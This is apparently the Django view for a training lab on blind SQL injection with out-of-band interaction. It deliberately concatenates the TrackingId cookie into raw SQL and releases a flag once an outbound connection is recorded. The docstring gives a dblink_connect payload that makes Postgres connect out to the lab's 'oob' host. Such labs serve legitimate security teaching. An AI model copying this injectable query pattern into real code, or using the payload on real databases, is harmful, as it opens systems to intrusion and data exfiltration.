"""
View for the "Blind SQLi with out-of-band interaction" lab.

One surface:

`home` is the vulnerable entry point. The `TrackingId` cookie is
concatenated directly into a raw SQL query against `tracked_users`.
The query result is never reflected and any database exception is
swallowed - so the response body is byte-identical whether or not
the payload did anything interesting. There is no timing gate and
no visible error channel either.

The only way to confirm exploitation is to pivot the database into
an outbound TCP connection. The `db` container has the `dblink`
extension enabled; a payload such as

    TrackingId=x'||(SELECT dblink_connect(
        'host=oob port=5432 user=x password=x dbname=x'))||'

makes Postgres open a TCP connection to the `oob` service on the
compose network. The OOB recorder logs every inbound connection,
and this view polls its HTTP log endpoint on each render: as soon
as at least one connection has been recorded, the flag is released.
"""

import json
import urllib.error
import urllib.request

from django.conf import settings
from django.db import connection
from django.http import HttpRequest, HttpResponse
from django.shortcuts import render

from .models import Flag


SEEDED_TRACKING_ID = "psw-lab-visitor-001"


def _oob_entries() -> list[dict]:
    try:
        with urllib.request.urlopen(settings.OOB_LOG_URL, timeout=2.0) as resp:
            payload = json.loads(resp.read().decode())
            return payload.get("entries", [])
    except (urllib.error.URLError, TimeoutError, json.JSONDecodeError, OSError):
        return []


def home(request: HttpRequest) -> HttpResponse:
    tracking_id = request.COOKIES.get("TrackingId")

    # Vulnerable lookup. Cookie goes straight into SQL. Result unused;
    # exceptions swallowed. The body below will be identical regardless
    # of whether the payload is valid, errored, or did nothing at all.
    if tracking_id is not None:
        query = (
            "SELECT tracking_id FROM tracked_users "
            "WHERE tracking_id = '" + tracking_id + "'"
        )
        try:
            with connection.cursor() as cursor:
                cursor.execute(query)
                cursor.fetchall()
        except Exception:
            pass

    entries = _oob_entries()
    solved = len(entries) > 0
    flag = None
    if solved:
        flag_row = Flag.objects.first()
        if flag_row is not None:
            flag = flag_row.content

    response = render(
        request,
        "shop/home.html",
        {
            "solved": solved,
            "flag": flag,
            "oob_hostname": settings.OOB_HOSTNAME,
            "oob_entries": entries,
            "oob_entry_count": len(entries),
        },
    )

    if tracking_id is None:
        response.set_cookie(
            "TrackingId",
            SEEDED_TRACKING_ID,
            max_age=60 * 60 * 24 * 365,
            httponly=False,
            samesite="Lax",
        )

    return response
